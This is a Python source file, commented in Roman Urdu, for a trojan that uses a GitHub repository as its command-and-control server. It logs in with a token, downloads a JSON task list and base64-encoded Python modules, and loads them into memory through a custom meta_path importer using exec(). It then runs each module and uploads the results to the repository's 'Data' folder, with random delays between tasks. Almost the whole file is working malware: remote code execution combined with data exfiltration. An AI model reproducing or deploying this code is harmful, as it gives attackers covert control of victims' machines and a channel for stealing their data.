import base64
import github3
import importlib
import importlib.util
import importlib.machinery
import json
import random
import sys
import time
from datetime import datetime

# STEP 1: GitHub se mahfooz connection banana
def github_connect():
    try:
        # Aapke folder mein maujood token file ko parha ja raha hai
        with open('mytoken.txt', 'r') as f:
            token = f.read().strip()
    except FileNotFoundError:
        print("[-] Error: 'mytoken.txt' file nahi mili! Pehle ye file banayein.")
        sys.exit()

    # Aapka GitHub Username aur Repository Name yahan set kar diya hai
    username = 'Uzair1179'
    repository = 'Trojan'
    
    # GitHub par login ho raha hai
    session = github3.login(token=token)
    return session.repository(username, repository)

# STEP 2: GitHub se kisi bhi file ka raw data/code uthana
def get_file_contents(dirname, module_name, repo):
    try:
        file_path = f"{dirname}/{module_name}"
        file_content = repo.file_contents(file_path)
        return file_content.content
    except Exception as e:
        return None

# STEP 3: Automated Configuration (.json file) internet se download karna
def get_trojan_config(repo):
    config_json = get_file_contents('config', 'abc.json', repo)
    if config_json is not None:
        return json.loads(config_json.decode('utf-8'))
    print("[-] Error: GitHub par config file nahi mil saki!")
    return []

# STEP 4: Results ko GitHub ke 'Data' folder mein upload karna
def store_module_result(module_name, data, repo):
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    remote_path = f"Data/{module_name}-{timestamp}.txt"
    data_str = str(data)
    
    print(f"[*] Data upload ho raha hai: {remote_path}")
    repo.create_file(
        path=remote_path,
        message=f"Trojan report for {module_name}",
        content=data_str.encode('utf-8')
    )
    print(f"[+] {module_name} ka data kamyabi se upload ho gaya!")

# STEP 5: Custom Loader jo internet se code download karke RAM mein chalayega
class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print(f"[*] GitHub se module dhoonda ja raha hai: {name}")
        self.repo = github_connect()
        
        # 'modules' folder se aapki python file uthayega
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library).decode('utf-8')
            return self
        return None

    def load_module(self, name):
        # Direct module structure bina hard disk ke RAM mein tayyar karna
        new_module = sys.modules.setdefault(name, importlib.util.module_from_spec(
            importlib.machinery.ModuleSpec(name, loader=self)
        ))
        new_module.__file__ = f"github://{name}"
        new_module.__loader__ = self
        
        # RAM ke us hissay mein code ko execute (chalu) kar dena
        exec(self.current_module_code, new_module.__dict__)
        return new_module

# MAIN RUNNER: Automated Loop Execution with Parameter Passing
if __name__ == '__main__':
    print("[*] Trojan Automated Engine chalu ho raha hai...")
    
    # Custom loader ko Python ke meta_path mein insert karna
    sys.meta_path.insert(0, GitImporter())
    
    repo = github_connect()
    
    # GitHub se instructions download karein
    config = get_trojan_config(repo)
    print(f"[+] GitHub se instructions mil gayin: {config}")
    
    # Instructions ke mutabiq saare modules ko loop mein chalana
    for task in config:
        module_name = task['module']
        try:
            importer = GitImporter()
            loader = importer.find_module(module_name)
            if loader:
                module = loader.load_module(module_name)
                print(f"[+] {module_name} RAM mein load ho gaya. Running...")
                
                # 🟢 ADVANCED FIX: **task likhne se json ke saare arguments (path, action) 
                # khud-ba-khud module ke andar chale jayenge.
                result = module.run(**task)
                
                # Result ko automatic GitHub par upload karna
                store_module_result(module_name, result, repo)
            else:
                print(f"[-] GitHub par '{module_name}.py' nahi mil saki.")
        except Exception as e:
            print(f"[-] {module_name} chalane mein masla aaya: {e}")
        
        # Ek task poora hone ke baad thoda delay
        time.sleep(random.randint(2, 5))
